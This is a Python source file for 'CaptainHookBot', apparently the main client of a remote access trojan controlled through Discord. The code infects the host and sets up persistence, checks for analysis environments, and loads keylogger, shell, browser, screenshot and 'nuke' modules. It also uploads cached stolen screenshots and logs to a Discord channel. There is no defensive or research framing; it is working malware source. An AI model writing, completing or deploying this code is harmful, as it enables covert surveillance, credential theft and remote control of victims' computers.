import asyncio
import discord
from discord.ext import commands
import os
import sys

from src.client.core.config import Config
from src.client.core.platform import Platform
from src.client.core.security import AntiAnalysis, Elevation
from src.client.core.persistence import Persistence
from src.client.core.cache import OfflineCache
from src.client.core.wraith import WraithEngine
import requests
import io

class CaptainHookBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.all()
        super().__init__(command_prefix=Config.COMMAND_PREFIX, intents=intents)
        self.session_channels = {}
        self.offline_cache = OfflineCache()
        self.wraith = WraithEngine()
        self.is_connected = True

    async def setup_hook(self):
        # 0. Wraith Melt (Initial Infection & Persistence)
        # Only melts if NOT in the final install path
        self.wraith.melt()

        # 1. Security Check
        if AntiAnalysis.check_all():
            print("Environment analysis detected. Exiting for safety.")
            # sys.exit(0)

        # 2. Persistence Install
        Persistence.install()

        # 3. Load modules
        modules = ["screenshot", "keylogger", "shell", "browser", "media", "info", "file_manager", "control", "fun", "nuke"]
        for module in modules:
            try:
                await self.load_extension(f"src.client.modules.{module}")
                print(f"Loaded module: {module}")
            except Exception as e:
                print(f"Failed to load module {module}: {e}")
        
        # 4. Start Heartbeat
        self.loop.create_task(self.connectivity_heartbeat())

    async def connectivity_heartbeat(self):
        """Monitor connection and dump cache upon reconnection."""
        while True:
            try:
                # Basic check: Can we reach a known Discord IP?
                # Using a 5s timeout to avoid blocking
                requests.get("https://discord.com", timeout=5)
                
                if not self.is_connected:
                    self.is_connected = True
                    print("Reconnected! Clearing cache...")
                    await self.process_offline_cache()
            except:
                if self.is_connected:
                    self.is_connected = False
                    print("Connection lost. Entering offline mode...")
            
            await asyncio.sleep(60) # Check every minute

    async def process_offline_cache(self):
        """Decrypt and upload all files from the offline cache."""
        pending_files = self.offline_cache.get_pending_files()
        if not pending_files:
            return

        # Get our main channel (placeholder logic)
        channel = self.get_channel(int(Config.GUILD_ID)) # Needs real logic to find the session channel
        if not channel: return

        await channel.send(f"🔄 **Reconnected!** Sending {len(pending_files)} cached logs...")

        for file_path in pending_files:
            try:
                decrypted_content = self.offline_cache.decrypt_file(file_path)
                if decrypted_content:
                    # Upload based on filename (screenshots are binary, logs are text)
                    name = os.path.basename(file_path)
                    if "screenshot" in name or "camshot" in name:
                        discord_file = discord.File(io.BytesIO(decrypted_content), filename=name.replace(".cache", ".png"))
                        await channel.send(f"📸 Cached Image:", file=discord_file)
                    else:
                        text_content = decrypted_content.decode(errors='replace')
                        await channel.send(f"📄 **Cached Log:**\n```\n{text_content[:1800]}\n```")
                
                os.remove(file_path)
            except Exception as e:
                print(f"Error processing cache file {file_path}: {e}")

    async def on_ready(self):
        print(f"Logged in as {self.user.name} ({self.user.id})")
        print(f"Running on {Platform.get_system_info()['os']}")
        
        # Initial setup, checking environment, etc.
        self.ensure_environment()

    def ensure_environment(self):
        # Create necessary directories
        appdata = Platform.get_appdata_path()
        own_path = os.path.join(appdata, Config.OWN_DIR_NAME)
        logs_path = os.path.join(own_path, Config.LOGS_DIR_NAME)
        
        for path in [own_path, logs_path]:
            if not os.path.exists(path):
                os.makedirs(path)
                print(f"Created directory: {path}")

async def main():
    # In a real scenario, the placeholders would be replaced.
    # For local development, we might use environment variables.
    token = os.environ.get("DISCORD_TOKEN", Config.DISCORD_TOKEN)
    if "PLACEHOLDER" in token:
         print("Error: No Discord token provided. Please use the builder or set DISCORD_TOKEN environment variable.")
         # sys.exit(1) # Commented out for now to allow some initial testing if needed

    bot = CaptainHookBot()
    async with bot:
        await bot.start(token)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
